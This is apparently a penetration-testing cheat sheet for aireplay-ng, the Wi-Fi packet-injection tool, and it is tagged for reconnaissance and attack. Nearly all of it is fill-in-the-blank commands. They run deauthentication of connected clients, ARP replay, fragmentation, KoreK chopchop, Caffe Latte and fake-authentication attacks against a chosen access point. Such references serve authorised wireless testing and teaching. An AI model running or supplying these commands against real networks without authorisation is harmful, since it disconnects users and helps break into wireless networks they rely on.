# aireplay-ng
% wifi, aireplay-ng
#plateform/linux #target/remote #cat/RECON #cat/ATTACK

## _desc
```
generate wifi traffic. The device must be set to monitor mode and channel must be set.
```

## _repo
```
```

## _doc
```
https://www.aircrack-ng.org/doku.php?id=aireplay-ng
```

## _install
```
```

## Injection test
```bash
sudo aireplay-ng --test <wlan_mon_interface|wmon> 
```

## Injection test essid
```bash
sudo aireplay-ng --test -e <essid> <wlan_mon_interface|wmon> 
```

## Injection test essid
```bash
sudo aireplay-ng --test -e <essid> -a <bssid> <wlan_mon_interface|wmon> 
```


## Deauthentication
```bash
sudo iw dev <wlan_mon_interface|wmon> set channel <wlan_channel> && 
sudo aireplay-ng --deauth <count|5> -a <bssid> -c <wlan_station_mac> <wlan_mon_interface|wmon>
```

## ARP capture / replay attack
```bash
sudo iw dev <wlan_mon_interface|wmon> set channel <wlan_channel> && 
sudo aireplay-ng --arpreplay -b <bssid> -h <wlan_station_mac> <wlan_mon_interface|wmon>
```

## fragment attack
```bash
sudo iw dev <wlan_mon_interface|wmon> set channel <wlan_channel> && sudo aireplay-ng --fragment -b <bssid> -h <wlan_station_mac> <wlan_mon_interface|wmon>
```

## KoreK chopchop attack
```bash
sudo iw dev <wlan_mon_interface|wmon> set channel <wlan_channel> && sudo aireplay-ng --chopchop -b <bssid> -h <wlan_station_mac> <wlan_mon_interface|wmon>
```

## ARP injection
```bash
sudo iw dev <wlan_mon_interface|wmon> set channel <wlan_channel> && sudo aireplay-ng --interactive -r <forged_arp_fle>.cap -h <bssid> <wlan_mon_interface|wmon>
```

## Cafe latte attack
```bash
sudo iw dev <wlan_mon_interface|wmon> set channel <wlan_channel> && sudo aireplay-ng -6 -D -b <bssid> -h <wlan_station_mac> <wlan_mon_interface|wmon>
```

## fake auth
```bash
sudo aireplay-ng --fakeauth 1000 -o 1 -q 5 -e <ssid> -a <bssid> -h <current_mac> <wlan_mon_interface|wmon>
```